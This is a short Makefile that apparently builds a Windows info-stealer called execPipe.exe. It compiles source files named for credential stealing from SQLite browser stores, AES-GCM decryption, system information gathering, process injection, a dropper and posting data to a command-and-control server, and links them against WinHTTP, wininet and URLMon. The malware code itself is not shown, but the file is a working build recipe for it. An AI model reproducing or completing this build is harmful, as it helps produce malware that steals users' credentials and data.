CC=gcc
CXX=g++
LDFLAGS=  -static -lshell32  -lshlwapi -lcrypt32 -lbcrypt -lUserenv -lWinhttp -ladvapi32 -lshlwapi -lwininet -lUrlmon

execPipe:
	$(CXX)  exec_with_pipe.cpp ..\Stealer\stealer.cpp ..\Stealer\SQLfunctions.cpp ..\Stealer\sqlite3.o ..\aes_gcm.cpp ..\Feiyu\GatherInfo.cpp ..\Feiyu\Injection.cpp ..\Feiyu\Dropper.cpp ..\Feiyu\sendToC2\Post.cpp ..\HTTPstuff.cpp $(LDFLAGS) -o execPipe.exe 